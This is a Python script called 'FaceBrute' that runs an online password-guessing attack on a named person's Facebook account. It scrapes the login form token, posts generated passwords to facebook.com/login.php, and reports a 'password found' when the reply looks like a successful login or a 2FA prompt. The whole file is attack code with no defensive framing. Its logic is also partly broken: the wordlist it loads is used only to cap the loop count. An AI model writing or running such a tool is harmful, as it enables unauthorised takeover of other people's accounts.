import os.path
import requests
from bs4 import BeautifulSoup
import sys
import string
import itertools

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}

def generate_passwords(length):
    chars = string.ascii_letters + string.digits + '@#'
    passwords = itertools.product(chars, repeat=length)
    return (''.join(password) for password in passwords)

def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies

def is_this_a_password(identifier, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = identifier
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False

if __name__ == "__main__":
    print('\n---------- Welcome To FaceBrute ----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print("Password file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("Password file selected: ", PASSWORD_FILE)
    identifier = input('Enter Email/Username or Facebook UID to target: ').strip()
    for length in range(MIN_PASSWORD_LENGTH, 10): # try increasing length up to 10
        passwords = generate_passwords(length)
        for index, password in zip(range(password_data.__len__()), passwords):
            print("Trying password [", index, "]: ", password)
            if is_this_a_password(identifier, index, password):
                sys.exit(0)
